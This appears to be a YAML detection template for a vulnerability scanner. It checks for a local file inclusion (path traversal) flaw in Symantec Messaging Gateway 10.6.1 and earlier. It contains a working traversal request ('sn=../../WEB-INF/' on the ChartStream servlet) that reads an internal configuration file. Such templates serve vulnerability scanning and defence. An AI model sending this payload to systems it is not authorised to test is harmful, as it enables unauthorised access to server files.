http:
- matchers:
  - type: word
    words:
    - struts-default.xml
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/brightmail/servlet/com.ve.kavachart.servlet.ChartStream?sn=../../WEB-INF/'
id: symantec-messaging-gateway
info:
  author: Random_Robbie
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  description: Symantec Messaging Gateway 10.6.1 and prior are vulnerable to local
    file inclusion.
  metadata:
    max-request: 1
  name: Symantec Messaging Gateway <=10.6.1 - Local File Inclusion
  severity: high
  tags: lfi,messaging,symantec,vuln
